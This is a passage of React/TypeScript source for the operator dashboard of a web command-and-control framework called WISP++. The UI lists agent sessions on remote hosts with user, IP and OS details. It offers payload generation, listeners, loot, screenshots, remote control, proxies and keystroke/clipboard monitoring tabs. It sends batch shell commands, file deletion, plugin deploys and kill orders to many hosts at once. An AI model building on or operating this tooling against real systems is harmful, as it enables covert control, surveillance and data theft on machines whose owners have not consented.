import { useEffect, useMemo, useRef, useState } from 'react';
import { useStore, CMD_NAMES, type DynKind } from './store';
import { useI18n, tr } from './i18n';
import ListenerPanel from './features/listeners/ListenerPanel';
import PayloadPanel from './features/payloads/PayloadPanel';
import FilesPanel from './features/files/FilesPanel';
import TermPanel from './features/terminal/TermPanel';
import ViewPanel from './features/terminal/ViewPanel';
import MetricsPanel from './features/metrics/MetricsPanel';
import ProjectsModal from './features/projects/ProjectsModal';
import { Api } from './api';
import { CmdPalette, ToastHost } from './palette';
import { Ansi } from './ansi';
import { GoalCanvas } from './goalcanvas';
import { ago, fullTime, shortTime, copy, fmtSize } from './ui';
import type { DeliveryRow, FServerConfig, FServerStatus, PayloadMeta, RootFileRow, Session, ShareRow, SysDetail } from './types';

const T = tr;

export default function App() {
  const st = useStore();

  useEffect(() => {
    if (!st.token) return;
    st.refresh().catch(() => useStore.setState({ error: T('errNoTeam') }));
    st.connectSSE();
    const t = setInterval(() => useStore.getState().refresh().catch(() => {}), 15000);
    return () => clearInterval(t);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [st.token]);

  const [pal, setPal] = useState(false);
  // Squeeze guard: below the breakpoint the AI column collapses because the
// session table would otherwise lose all room; growing back does not re-open
// it, so an explicit choice is never overridden. Not persisted — wisp_ai_open
// keeps the operator's real preference across loads.
  useEffect(() => {
    const f = () => {
      if (window.innerWidth < 1080 && useStore.getState().aiOpen) useStore.setState({ aiOpen: false });
    };
    f();
    window.addEventListener('resize', f);
    return () => window.removeEventListener('resize', f);
  }, []);
  useEffect(() => {
    const kd = (e: KeyboardEvent) => {
      if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === 'k') { e.preventDefault(); setPal((x) => !x); return; }
      if (e.key === '?' && !(e.target instanceof HTMLInputElement) && !(e.target instanceof HTMLTextAreaElement)) { e.preventDefault(); useStore.getState().setHelpOpen(!useStore.getState().helpOpen); }
      if ((e.metaKey || e.ctrlKey) && /^[1-9]$/.test(e.key)) {
        e.preventDefault();
        const stt = useStore.getState();
        const order = ['console', 'logs', ...stt.dynTabs.map((x) => x.id)];
        const id = order[Number(e.key) - 1];
        if (id) stt.setActiveTab(id);
      }
      if (e.altKey && (e.key === 'ArrowUp' || e.key === 'ArrowDown')) {
        const el = e.target as HTMLElement | null;
        if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.isContentEditable)) return;
        e.preventDefault();
        const stt = useStore.getState();
        const pool = stt.sessions.filter((s) => s.status === 'online');
        const list = pool.length ? pool : stt.sessions;
        if (!list.length) return;
        const idx = list.findIndex((s) => s.id === stt.selected);
        const at = idx < 0 ? 0 : (idx + (e.key === 'ArrowDown' ? 1 : -1) + list.length) % list.length;
        const next = list[at];
        stt.setSelected(next.id);
        if (stt.view === 'agent') stt.openAgent(next.id, { section: stt.agentSection, tab: stt.agentTab });
      }
    };
    window.addEventListener('keydown', kd);
    return () => window.removeEventListener('keydown', kd);
  }, []);

  if (!st.token) return <TokenGate />;

  return (
    <div className={`app ${st.rail === 'narrow' ? 'rail-narrow' : 'rail-wide'}${st.aiOpen ? '' : ' ai-closed'}`} style={{ ['--aiw' as never]: `${st.aiW}px` }}>
      <CmdPalette open={pal} onClose={() => setPal(false)} />
      {st.helpOpen && <HelpOverlay onClose={() => useStore.getState().setHelpOpen(false)} />}
      <ToastHost />
      <ActivityBar />
      <CenterPanel onPalette={() => setPal(true)} />
      {st.aiOpen && <Resizer />}
      {st.modal === 'settings' && <SettingsModal onClose={() => st.setModal(null)} />}
      <AIPanel />
      <StatusBar />
    </div>
  );
}

function TokenGate() {
  const { t } = useI18n();
  const setToken = useStore((s) => s.setToken);
  const error = useStore((s) => s.error);
  const [v, setV] = useState('');
  return (
    <div className="gate">
      <div className="gate-blob g1" /><div className="gate-blob g2" /><div className="gate-blob g3" />
      <div className="gate-ctl">
        <button className="lang-btn" onClick={() => useI18n.getState().toggle()}>{t('langBtn')}</button>
        <button className="theme-btn" onClick={() => useStore.getState().toggleTheme()}>{useStore((s) => s.theme) === 'dark' ? '☀' : '🌙'}</button>
      </div>
      <div className="gate-card">
        <div className="gate-logo">W</div>
        <h1>WISP++</h1>
        <span className="gate-sub">{t('loginTitle')}</span>
        <input
          autoFocus
          type="password"
          value={v}
          placeholder="X-Wisp-Token"
          onChange={(e) => setV(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && v && setToken(v.trim())}
        />
        <button disabled={!v} onClick={() => setToken(v.trim())}>{t('loginBtn')} →</button>
        {error && <div className="gate-err">{error}</div>}
        <p>{t('loginHint')} <code>data/api.token</code></p>
      </div>
      <div className="gate-foot">Web C2 · Type1–4 · WASM · AI — {t('gateAuthFoot')}</div>
    </div>
  );
}

const MODULES = [
  { ico: '👥', lbl: 'sessions', view: 'sessions' as const },
  { ico: '🔌', lbl: 'listeners', tab: 'lsn' as const },
  { ico: '📦', lbl: 'payload', tab: 'payload' as const },
  { ico: '📁', lbl: 'files', tab: 'fserver' as const },
  { ico: '🎒', lbl: 'loot', tab: 'loot' as const },
  { ico: '🧩', lbl: 'plugins', tab: 'plugin' as const },
  { ico: '📊', lbl: 'metrics', tab: 'metrics' as const },
  { ico: '📄', lbl: 'reports', tab: 'report' as const },
  { ico: '🎯', lbl: 'orchestration', tab: 'goal' as const },
  { ico: '✨', lbl: 'ai' },
];

// Resizer: drag the AI column wider/narrower; double-click resets.
function Resizer() {
  const setAIW = useStore((s) => s.setAIW);
  const start = (e: React.MouseEvent) => {
    e.preventDefault();
    const x0 = e.clientX;
    const w0 = useStore.getState().aiW;
    const move = (ev: MouseEvent) => {
      const next = Math.min(680, Math.max(260, w0 - (ev.clientX - x0)));
      setAIW(next);
    };
    const up = () => {
      window.removeEventListener('mousemove', move);
      window.removeEventListener('mouseup', up);
    };
    window.addEventListener('mousemove', move);
    window.addEventListener('mouseup', up);
  };
  return (
    <div
      className="resizer"
      onMouseDown={start}
      onDoubleClick={() => setAIW(340)}
      title={T('aiResizeHint')}
    />
  );
}

function ActivityBar() {
  const { t } = useI18n();
  const n = useStore((s) => s.sessions.filter((x) => x.status === 'online').length);
  const railNarrow = useStore((s) => s.rail === 'narrow');
  const toggleRail = useStore((s) => s.toggleRail);
  const aiOpen = useStore((s) => s.aiOpen);
  const view = useStore((s) => s.view);
  const setView = useStore((s) => s.setView);
  return (
    <div className="activity">
      {MODULES.map((m) => (
        <div
          key={m.lbl}
          className={`act${(view === 'sessions' || view === 'agent') && m.lbl === 'sessions' ? ' on' : ''}${m.lbl === 'ai' && aiOpen ? ' on' : ''}`}
          title={m.lbl === 'ai' ? t(aiOpen ? 'aiHide' : 'aiShow') : m.view || m.tab ? t(m.lbl) : t(m.lbl) + t('later')}
          onClick={m.lbl === 'ai'
            ? () => useStore.getState().toggleAiOpen()
            : m.view ? () => setView(m.view as 'sessions') : m.tab ? () => {
            setView('sessions');
            const { selected, openTab: ot } = useStore.getState();
            const kind = m.tab as 'payload' | 'files' | 'view' | 'lsn' | 'plugin' | 'report' | 'goal' | 'fserver' | 'metrics';
            if (['payload', 'lsn', 'plugin', 'report', 'goal', 'fserver', 'metrics'].includes(kind)) ot(kind as never);
            else if (selected) ot(kind, selected);
            else useStore.setState({ error: useI18n.getState().t('pickSessionFirst') });
          } : undefined}
        >
          <span className="ico">{m.ico}</span>
          {!railNarrow && <span className="lbl">{t(m.lbl)}</span>}
          {m.lbl === 'sessions' && n > 0 && <span className="badge">{n}</span>}
        </div>
      ))}
      <div
        className="act act-sep"
        title={useI18n.getState().t('settings')}
        onClick={() => useStore.getState().setModal('settings')}
      >
        <span className="ico">⚙</span>
        {!railNarrow && <span className="lbl">{t('settings')}</span>}
      </div>
      <div
        className="act rail-toggle"
        title={railNarrow ? T('railExpand') : T('railNarrowW')}
        onClick={toggleRail}
      >
        <span className="ico">{railNarrow ? '»' : '«'}</span>
      </div>
    </div>
  );
}


function CenterPanel({ onPalette }: { onPalette: () => void }) {
  const { t } = useI18n();
  const { sessions, selected, bottomH, dynTabs, activeTab, view, agentId } = useStore();
  const openTab = useStore((st) => st.openTab);
  void openTab;
  const [q, setQ] = useState('');
  const proj = useStore((s) => s.project);
  const setProj = useStore((s) => s.setProject);
  const allProjects = useStore((s) => s.projects);
  const [ctx, setCtx] = useState<{ x: number; y: number; id: string } | null>(null);
  const [projMgr, setProjMgr] = useState(false);
  const [multi, setMulti] = useState<Set<string>>(new Set());
  const dockMaxH = Math.max(360, Math.round(window.innerHeight * 0.62));
  const dockMaxed = bottomH >= dockMaxH - 4;
  const prevBottom = useRef(230);
  const toggleDock = () => {
    if (dockMaxed) useStore.getState().setBottomH(prevBottom.current);
    else { prevBottom.current = bottomH; useStore.getState().setBottomH(dockMaxH); }
  };

  const projects = Array.from(new Set([
    ...allProjects.map((p) => p.ID),
    ...sessions.map((s) => s.project),
    ...(proj ? [proj] : []),
  ]));
  const ql = q.trim().toLowerCase();
  const list = sessions.filter((s) => {
    if (proj && s.project !== proj) return false;
    if (!ql) return true;
    return [String(s.num), s.id, s.info.hostname, s.info.user, s.info.internal_ip ?? '', s.info.os, s.info.arch, (s.tags ?? []).join(' '), s.notes ?? '']
      .join(' ')
      .toLowerCase()
      .includes(ql);
  });
  const online = list.filter((x) => x.status === 'online').length;

  type SortKey = 'num' | 'id' | 'project' | 'ip' | 'user' | 'os' | 'seen' | 'status';
  const [sort, setSort] = useState<{ k: SortKey; d: 1 | -1 }>(
    () => JSON.parse(localStorage.getItem('wisp_sort') ?? '{"k":"num","d":1}'),
  );
  const toggleSort = (k: SortKey) => {
    const next = sort.k === k ? { k, d: (sort.d * -1) as 1 | -1 } : { k, d: 1 as const };
    setSort(next);
    localStorage.setItem('wisp_sort', JSON.stringify(next));
  };
  const rank: Record<string, number> = { online: 0, idle: 1, offline: 2 };
  const sval = (s: Session, k: SortKey): string | number => {
    switch (k) {
      case 'num': return s.num;
      case 'id': return s.id;
      case 'project': return s.project;
      case 'ip': return s.info.internal_ip ?? '';
      case 'user': return s.info.user;
      case 'os': return `${s.info.os} ${s.info.arch} ${s.info.hostname}`;
      case 'seen': return -new Date(s.last_seen).getTime(); // newer first when asc
      case 'status': return rank[s.status] ?? 9;
    }
  };
  const sorted = useMemo(
    () => [...list].sort((a, b) => {
      const va = sval(a, sort.k), vb = sval(b, sort.k);
      const c = typeof va === 'number' && typeof vb === 'number'
        ? va - vb
        : String(va).localeCompare(String(vb), undefined, { numeric: true });
      return c * sort.d;
    }),
    [list, sort],
  );
  const Th = ({ k, label, style, cls }: { k: SortKey; label: string; style: React.CSSProperties; cls?: string }) => (
    <div className={`th sortable${sort.k === k ? ' on' : ''}${cls ? ' ' + cls : ''}`} style={style} onClick={() => toggleSort(k)} title={T('clickSort')}>
      {label}
      <span className="arrow">{sort.k === k ? (sort.d > 0 ? '▲' : '▼') : ''}</span>
    </div>
  );
  if (view === 'agent' && agentId) return <AgentWorkspace id={agentId} />;
  return (
    <div className="center">
      <div className="crumb">
        <b>{t('sessionsTitle')}</b>
        <span className="search-box">🔍
          <input placeholder={t('filterPh')} value={q} onChange={(e) => setQ(e.target.value)} />
        </span>
        <select className="proj-sel" value={proj} onChange={(e) => setProj(e.target.value)}>
          <option value="">{t('allProjects')}</option>
          {projects.map((p) => <option key={p} value={p}>{p}</option>)}
        </select>
        <button className="proj-manage" title={t('projManage')} onClick={() => setProjMgr(true)}>⚙</button>
        <span className="count">{list.length} {t('nCount')} {online} {t('onlineWord')}</span>
        <span className="spacer" />
        <LsnChip />
        <button className="kbd-btn" onClick={onPalette} title={T("cmdPalette")}>⌘K</button>
            <button className="kbd-btn" onClick={() => useStore.getState().setHelpOpen(!useStore.getState().helpOpen)} title={T('helpTitle')}>?</button>
      </div>
      {multi.size > 0 && (
        <div className="batch-bar">
          <b>{t('multiSel')} {multi.size} {t('sessWord')}</b>
          <button onClick={() => {
            const ms = prompt(t('batchSleepPh'), '10000');
            if (!ms) return;
            const j = prompt(t('batchJitterPh'), '30');
            [...multi].forEach((id) => void useStore.getState().dispatch(id, 'sleep', { sleep_ms: +ms, jitter_pct: +(j ?? 30) }));
            useStore.getState().toast({ kind: 'ok', text: t('toastSleepN').replace('{n}', String(multi.size)) });
          }}>{t("batchSleep")}</button>
          <button onClick={() => {
            const cmd = prompt(t('batchCmdPh'), 'whoami');
            if (!cmd) return;
            [...multi].forEach((id) => void useStore.getState().dispatch(id, 'shell', { command: cmd, timeout_ms: 15000 }));
            useStore.getState().toast({ kind: 'ok', text: t('toastCmdN').replace('{n}', String(multi.size)) });
          }}>{t("batchCmd")}</button>
          <button onClick={() => {
            const pid = prompt(t('batchPluginPh'), 'demo-add');
            if (!pid) return;
            void fetch(`/api/plugins/${pid}/deploy`, { method: 'POST', headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '', 'Content-Type': 'application/json' }, body: JSON.stringify({ sessions: [...multi] }) })
              .then(async (r) => { const d = await r.json().catch(() => ({})); useStore.getState().toast({ kind: r.ok ? 'ok' : 'err', text: r.ok ? T('pluginDeployedN', { n: multi.size }) : `⚠ ${d.error ?? r.status}` }); });
          }}>{t("pgDeploy")}</button>
          <button className="danger" onClick={() => {
            if (!confirm(t('confirmKillN').replace('{n}', String(multi.size)))) return;
            [...multi].forEach((id) => void useStore.getState().dispatch(id, 'kill', {}));
          }}>{t("batchKill")}</button>
          <button onClick={() => {
            [...multi].forEach((id) => void useStore.getState().dispatch(id, 'screenshot', {}));
            useStore.getState().toast({ kind: 'ok', text: t('toastShotN').replace('{n}', String(multi.size)) });
          }}>📷 {t("batchShot")}</button>
          <button onClick={() => {
            const tag = prompt(t('batchTagPh'), 'wave-1');
            if (!tag) return;
            [...multi].forEach((id) => {
              const cur = sessions.find((x: Session) => x.id === id);
              const tags = Array.from(new Set([...(cur?.tags ?? []), tag.trim()].filter(Boolean))).slice(0, 8);
              void fetch(`/api/sessions/${id}/meta`, { method: 'PATCH', headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '', 'Content-Type': 'application/json' }, body: JSON.stringify({ tags }) });
            });
            setTimeout(() => void useStore.getState().refresh(), 600);
            useStore.getState().toast({ kind: 'ok', text: t('toastTagN').replace('{n}', String(multi.size)) });
          }}>🏷 {t("batchTag")}</button>
          <button onClick={() => {
            const rows = sessions.filter((x: Session) => multi.has(x.id));
            const esc = (v: string) => `"${(v ?? '').replace(/"/g, '""')}"`;
            const csv = ['num,id,hostname,user,os,arch,ip,status,tags,notes,last_seen',
              ...rows.map((x) => [String(x.num), x.id, x.info.hostname, x.info.user, x.info.os, x.info.arch, x.info.internal_ip ?? '', x.status, (x.tags ?? []).join('|'), (x.notes ?? '').replace(/\n/g, ' '), x.last_seen].map(esc).join(','))].join('\n');
            const u = URL.createObjectURL(new Blob([csv], { type: 'text/csv' }));
            const el = document.createElement('a');
            el.href = u; el.download = `wispp-sessions-${new Date().toISOString().slice(0, 10)}.csv`; el.click();
            URL.revokeObjectURL(u);
          }}>⬇ CSV</button>
          <span style={{ marginLeft: 'auto', cursor: 'pointer' }} onClick={() => setMulti(new Set())}>{t('cancelSel')}</span>
        </div>
      )}
      <div className="table">
        {list.length === 0 && !q && !proj && (
          <div className="empty-guide">
            <div>{t('noSessions')}</div>
            <div className="steps">
              <div className="step"><b>1</b>{t('plGen')}</div>
              <div className="step"><b>2</b>{t('stepRun')}</div>
              <div className="step"><b>3</b>{t('stepBack')}</div>
            </div>
            <button onClick={() => useStore.getState().openTab('payload')}>{T("openPayloadGen")}</button>
          </div>
        )}
        <div className="thead">
          <div className="th" style={{ width: 44 }}>
            <input type="checkbox" className="cb on" checked={multi.size > 0 && multi.size === list.length}
              onChange={(e) => setMulti(e.target.checked ? new Set(list.map((x) => x.id)) : new Set())} />
          </div>
          <Th k="num" label={t('thId')} style={{ width: 48 }} />
          <Th k="id" label={t('thAgent')} style={{ width: 104 }} />
          <Th k="ip" label={t('thIP')} style={{ width: 118 }} cls="col-ip" />
          <Th k="user" label={t('thUser')} style={{ width: 104 }} cls="col-user" />
          <Th k="os" label={t('thHost')} style={{ flex: 1, minWidth: 140 }} />
          <Th k="seen" label={t('thSeen')} style={{ width: 88 }} />
            <div className="th col-tags" style={{ width: 132 }}>{t('thTags')}</div>
        </div>
        {list.length === 0 && (
          <div className="empty">
            {q || proj ? T('noMatch') : sessions.length === 0 ? (
              <div className="cta">
                <b>🛰️ {T('ctaTitle')}</b>
                <p>{T('ctaHint')}</p>
                <button className="p" onClick={() => { useStore.getState().setView('sessions'); useStore.getState().openTab('lsn'); }}>🔌 {T('ctaBtn')}</button>
              </div>
            ) : T('noSessionsYet')}
          </div>
        )}
        {sorted.map((s) => (
          <div key={s.id} className={`row${s.id === selected ? ' sel' : ''}`}
            onClick={() => useStore.getState().setSelected(s.id)}
            onDoubleClick={() => { useStore.getState().setSelected(s.id); useStore.getState().openAgent(s.id); }}
            onContextMenu={(e) => {
              e.preventDefault();
              useStore.getState().setSelected(s.id);
              setCtx({ x: e.clientX, y: e.clientY, id: s.id });
            }}
          >
            <div className="cell" style={{ width: 44 }}>
              <input type="checkbox" className={`cb${multi.has(s.id) ? ' on' : ''}`} checked={multi.has(s.id)}
                onClick={(e) => e.stopPropagation()}
                onChange={() => setMulti((x) => { const n = new Set(x); if (n.has(s.id)) n.delete(s.id); else n.add(s.id); return n; })} />
              <span className={s.status === 'online' ? 'c-ok' : s.status === 'idle' ? 'c-warn' : 'c-err'} style={s.color ? { color: s.color } : undefined}>●</span>
            </div>
            <div className="cell seqno" style={{ width: 48 }}>{s.num || '—'}</div>
            <div className="cell mono" style={{ width: 104 }} title={s.id}>{s.id.slice(0, 12)}</div>
            <div className="cell mono col-ip" style={{ width: 118 }}>{s.info.internal_ip || '—'}</div>
            <div className="cell col-user" style={{ width: 104 }}>{s.info.user}</div>
            <div className="cell muted" style={{ flex: 1, minWidth: 140 }} title={`${s.info.os}/${s.info.arch}`}><span className="os-ic">{s.info.os === 'windows' ? '⊞' : s.info.os === 'darwin' ? '◍' : '🐧'}</span>{s.info.hostname}<i className="os-tag">{s.info.os}/{s.info.arch}</i></div>
            <div className="cell time-ago" style={{ width: 88 }} title={fullTime(s.last_seen)}>{ago(s.last_seen)}</div>
            <div className="cell tags-cell col-tags">{(s.tags ?? []).slice(0, 2).map((tg) => <span key={tg} className="tag-chip" style={{ borderColor: s.color || undefined }} title={T('tagFilterHint')} onClick={(e) => { e.stopPropagation(); setQ(tg); }}>{tg}</span>)}{(s.tags?.length ?? 0) > 2 && <span className="tag-more">+{(s.tags ?? []).length - 2}</span>}</div>
            <div className="row-acts" onClick={(e) => e.stopPropagation()}>
              <button title={t('mOpenShell')} onClick={() => { useStore.getState().setSelected(s.id); useStore.getState().openTab('term', s.id); }}>›_</button>
              <button title={t('mFiles')} onClick={() => { useStore.getState().setSelected(s.id); useStore.getState().openTab('files', s.id); }}>📁</button>
              <button title={t('mRemote')} onClick={() => window.open(`/rc/${s.id}?token=${encodeURIComponent(localStorage.getItem('wisp_token') ?? '')}`, '_blank')}>🖥</button>
              <button title={t('mProxies')} onClick={() => { useStore.getState().setSelected(s.id); useStore.getState().openTab('proxies', s.id); }}>🌐</button>
            </div>
          </div>
        ))}
      </div>
      <VSplit />
      <div className="bottom" style={{ height: bottomH }}>
      <div className="tabs">
        <div className={`tab${activeTab === 'console' ? ' active' : ''}`} onClick={() => useStore.getState().setActiveTab('console')}>
          {t('tConsole')}
        </div>
        <div className={`tab${activeTab === 'logs' ? ' active' : ''}`} onClick={() => useStore.getState().setActiveTab('logs')}>
          📋 Logs
        </div>
        {dynTabs.map((t) => {
          const owner = t.session ? sessions.find((x) => x.id === t.session) : undefined;
          const label = useI18n.getState().t(TITLES[t.kind]) + (t.session ? ` — ${(owner?.id ?? t.session).slice(0, 8)}` : '');
          return (
            <div key={t.id} className={`tab${activeTab === t.id ? ' active' : ''}`}
              onClick={() => useStore.getState().setActiveTab(t.id)} title={owner ? label : T('sessDeleted')}
              onMouseDown={(e) => { if (e.button === 1) { e.preventDefault(); useStore.getState().closeTab(t.id); } }}>
              {label}
              <span className="x" onClick={(e) => { e.stopPropagation(); useStore.getState().closeTab(t.id); }}>✕</span>
            </div>
          );
        })}
        <span className="spacer" />
        <span className="tab-add" title={t(dockMaxed ? 'dockRestore' : 'dockMax')} onClick={toggleDock}>
          {dockMaxed ? '⤡' : '⤢'}
        </span>
        <span className="tab-add" title={useI18n.getState().t('tabHint')} onClick={() => useStore.getState().setView('sessions')}>＋</span>
      </div>
      <TabBody activeTab={activeTab} />
      </div>
      {ctx && <CtxMenu pos={ctx} onClose={() => setCtx(null)} />}
      {projMgr && <ProjectsModal onClose={() => setProjMgr(false)} />}
    </div>
  );
}

function LsnChip() {
  const [n, setN] = useState(0);
  useEffect(() => {
    const f = () => fetch('/api/listeners', { headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '' } })
      .then((r) => r.json()).then((x) => setN(Array.isArray(x) ? x.filter((l: { running: boolean }) => l.running).length : 0)).catch(() => {});
    f();
    const t = setInterval(f, 8000);
    return () => clearInterval(t);
  }, []);
  return <span className="chip blue" style={{ cursor: 'pointer' }} onClick={() => useStore.getState().openTab('lsn')} title="listeners">🔌 {n} {useI18n.getState().t('nListeners')}</span>;
}

const TITLES: Record<string, string> = { files: 'tf', term: 'tt', view: 'tv', info: 'ti', payload: 'tp', lsn: 'tlsn', plugin: 'tplg', report: 'trep', goal: 'tgoal', fserver: 'tfs', proxies: 'tprox', loot: 'tloot', timeline: 'ttimeline', metrics: 'tmtr' };

function TabBody({ activeTab }: { activeTab: string }) {
  const sessions = useStore((st) => st.sessions);
  if (activeTab === 'console' || activeTab === 'logs') {
    return activeTab === 'console' ? <Console /> : <TeamLogs />;
  }
  const tab = useStore.getState().dynTabs.find((t) => t.id === activeTab);
  if (!tab) return null;
  const owner = tab.session ? sessions.find((x) => x.id === tab.session) : undefined;
  if (tab.session && !owner) {
    return <div className="console"><div className="c-out muted">{useI18n.getState().t('sessionDeleted')}</div></div>;
  }
  switch (tab.kind) {
    case 'files': return <FilesPanel session={owner} />;
    case 'proxies': return <ProxiesPanel session={owner} />;
    case 'loot': return <LootPanel />;
    case 'timeline': return <TimelinePanel session={owner} />;
    case 'term': return <TermPanel session={owner} />;
    case 'view': return <ViewPanel session={owner} />;
    case 'info': return <InfoPanel session={owner} />;
    case 'payload': return <PayloadPanel />;
    case 'lsn': return <ListenerPanel asTab onBack={() => undefined} />;
    case 'plugin': return <PluginPanel asTab onBack={() => undefined} />;
    case 'report': return <ReportPanel asTab />;
    case 'goal': return <GoalPanel asTab />;
    case 'fserver': return <FServerPanel asTab />;
    case 'metrics': return <MetricsPanel />;
  }
}

function AgentWorkspace({ id }: { id: string }) {
  const { t } = useI18n();
  const closeAgent = useStore((s) => s.closeAgent);
  const session = useStore((s) => s.sessions.find((x) => x.id === id));
  const agentSection = useStore((s) => s.agentSection);
  const agentTab = useStore((s) => s.agentTab);
  const [split, setSplit] = useState(() => {
    const v = Number(localStorage.getItem('wisp_agent_split'));
    return Number.isFinite(v) && v >= 40 && v <= 80 ? v : 66;
  });
  const [bottomTab, setBottomTab] = useState<'main' | 'mon' | 'info'>(agentTab);
  const [mainView, setMainView] = useState<'files' | 'proc' | 'fwd'>(agentSection as 'files' | 'proc' | 'fwd');
  const [monView, setMonView] = useState<'shot' | 'keys' | 'clip'>('shot');
  const splitRef = useRef<HTMLDivElement>(null);

  useEffect(() => { localStorage.setItem('wisp_agent_split', String(Math.round(split))); }, [split]);

  const startDrag = (e: React.MouseEvent) => {
    e.preventDefault();
    const rect = splitRef.current?.getBoundingClientRect();
    if (!rect) return;
    const move = (ev: MouseEvent) => {
      const pct = Math.min(80, Math.max(40, ((ev.clientX - rect.left) / rect.width) * 100));
      setSplit(pct);
    };
    const up = () => { window.removeEventListener('mousemove', move); window.removeEventListener('mouseup', up); };
    window.addEventListener('mousemove', move);
    window.addEventListener('mouseup', up);
  };

  if (!session) {
    return (
      <div className="center">
        <div className="crumb">
          <button className="back" onClick={closeAgent}>← {t('backSessions')}</button>
          <b>{t('agentDeleted')}</b>
        </div>
      </div>
    );
  }

  const mainTabs = [
    { k: 'files' as const, label: t('agentFiles'), ico: '📁' },
    { k: 'proc' as const, label: t('agentProcs'), ico: '⚙' },
    { k: 'fwd' as const, label: t('agentFwd'), ico: '🔀' },
  ];
  const monTabs = [
    { k: 'shot' as const, label: t('agentShot'), ico: '📷' },
    { k: 'keys' as const, label: t('agentKeys'), ico: '⌨' },
    { k: 'clip' as const, label: t('agentClip'), ico: '📋' },
  ];

  return (
    <div className="agentws">
      <div className="agent-hd">
        <button className="back" onClick={closeAgent} title={t('backSessions')}>←</button>
        <span className={`agent-dot ${session.status}`} />
        <b>{session.info.hostname}</b>
        <span className="mono muted">#{session.num} · {session.id.slice(0, 12)}</span>
        <span className={`agent-chip ${session.status}`}>{session.status}</span>
        <span className="spacer" />
        <span className="agent-meta mono">
          {session.info.user} · {session.info.internal_ip || '—'} · {session.info.os}/{session.info.arch} · pid {session.info.pid} · {session.info.agent_ver} · {ago(session.last_seen)}
        </span>
      </div>

      <div className="agent-split" ref={splitRef}>
        <div className="agent-left" style={{ width: `${split}%` }}>
          <AgentConsole session={session} />
        </div>
        <div className="agent-div" onMouseDown={startDrag} onDoubleClick={() => setSplit(66)} title={t('agentSplitHint')} />
        <div className="agent-right">
          <DispatchLog session={session} />
        </div>
      </div>

      <div className="agent-bottom">
        <div className="tabs">
          <div className={`tab${bottomTab === 'main' ? ' active' : ''}`} onClick={() => setBottomTab('main')}>{t('agentMain')}</div>
          <div className={`tab${bottomTab === 'mon' ? ' active' : ''}`} onClick={() => setBottomTab('mon')}>{t('agentMonitoring')}</div>
          <div className={`tab${bottomTab === 'info' ? ' active' : ''}`} onClick={() => setBottomTab('info')}>{t('agentInfo')}</div>
        </div>
        {bottomTab !== 'info' && (
          <div className="agent-subtabs">
            {bottomTab === 'main'
              ? mainTabs.map((x) => (
                <button key={x.k} className={`agent-subtab${mainView === x.k ? ' on' : ''}`} onClick={() => setMainView(x.k)}>{x.ico} {x.label}</button>
              ))
              : monTabs.map((x) => (
                <button key={x.k} className={`agent-subtab${monView === x.k ? ' on' : ''}`} onClick={() => setMonView(x.k)}>{x.ico} {x.label}</button>
              ))}
          </div>
        )}
        <div className="agent-content">
          {bottomTab === 'info' ? (
            <AgentInfoPanel session={session} />
          ) : bottomTab === 'main' ? (
            mainView === 'files' ? <FilesPanel session={session} /> :
              mainView === 'proc' ? <ProcTable sid={session.id} /> :
                <ProxiesPanel session={session} />
          ) : monView === 'shot' ? (
            <ShotPanel session={session} />
          ) : (
            <div className="agent-placeholder">
              <b>{monView === 'keys' ? t('agentKeys') : t('agentClip')}</b>
              <span>{t('agentNotImpl')}</span>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function AgentConsole({ session }: { session: Session }) {
  const { t } = useI18n();
  const runTask = useStore((s) => s.runTask);
  const [mode, setMode] = useState<'task' | 'shell'>('task');
  const [line, setLine] = useState('');
  const [lines, setLines] = useState<{ kind: 'in' | 'out' | 'err' | 'info'; text: string }[]>([]);
  const [hist, setHist] = useState<string[]>(() => JSON.parse(localStorage.getItem('wisp_agent_hist') ?? '[]'));
  const [hIdx, setHIdx] = useState(-1);
  const [busy, setBusy] = useState(false);
  const bodyRef = useRef<HTMLDivElement>(null);

  useEffect(() => { bodyRef.current?.scrollTo({ top: bodyRef.current.scrollHeight }); }, [lines.length]);

  const say = (kind: 'in' | 'out' | 'err' | 'info', text: string) => setLines((x) => [...x.slice(-499), { kind, text }]);

  const send = async () => {
    const raw = line.trim();
    if (!raw || busy) return;
    setLine('');
    setHIdx(-1);
    setHist((h) => {
      const n = [raw, ...h.filter((x) => x !== raw)].slice(0, 50);
      localStorage.setItem('wisp_agent_hist', JSON.stringify(n));
      return n;
    });
    say('in', `› ${raw}`);
    const [head0, ...rest] = raw.split(/\s+/);
    const head = head0.toLowerCase();
    const arg = raw.slice(head0.length).trim();
    let cmd = '';
    let args: Record<string, unknown> = {};
    const need = (v: string) => { if (!v) { say('err', `usage: ${head} <value>`); return false; } return true; };
    switch (head) {
      case 'help': say('info', t('agentHelp')); return;
      case 'clear': setLines([]); return;
      case 'shell': if (!need(arg)) return; cmd = 'shell'; args = { command: arg, timeout_ms: 60000 }; break;
      case 'ls': cmd = 'ls'; args = arg ? { path: arg } : {}; break;
      case 'mkdir': if (!need(arg)) return; cmd = 'mkdir'; args = { path: arg }; break;
      case 'rm': if (!need(arg)) return; cmd = 'rm'; args = { path: arg }; break;
      case 'sleep': cmd = 'sleep'; args = { sleep_ms: Number(rest[0]) || 1000, jitter_pct: Number(rest[1]) || 0 }; break;
      case 'sysinfo': case 'pwd': case 'ps': case 'screenshot': case 'exit': case 'kill':
        cmd = head; break;
      default:
        cmd = 'shell'; args = { command: raw, timeout_ms: 60000 };
    }
    setBusy(true);
    try {
      const rec = await runTask(session.id, cmd, args, 65000);
      const out = rec.result?.output ?? '';
      const ok = rec.result?.ok;
      const exit = rec.result?.exit;
      say(ok ? 'out' : 'err', out || (ok ? '(ok)' : `${t('failedWord')} (${rec.status})`));
      if (typeof exit === 'number' && exit !== 0 && ok) say('info', `[exit ${exit}]`);
    } catch (e) {
      say('err', String(e));
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="agent-pane">
      <div className="agent-pane-hd">
        <b>{t('agentCmd')}</b>
        <span className="spacer" />
        {busy && <span className="muted">{t('agentBusy')}</span>}
        <select className="agent-mode" value={mode} onChange={(e) => setMode(e.target.value as 'task' | 'shell')} title={t('agentModeHint')}>
          <option value="task">{t('agentModeTask')}</option>
          <option value="shell">{t('agentModeShell')}</option>
        </select>
      </div>
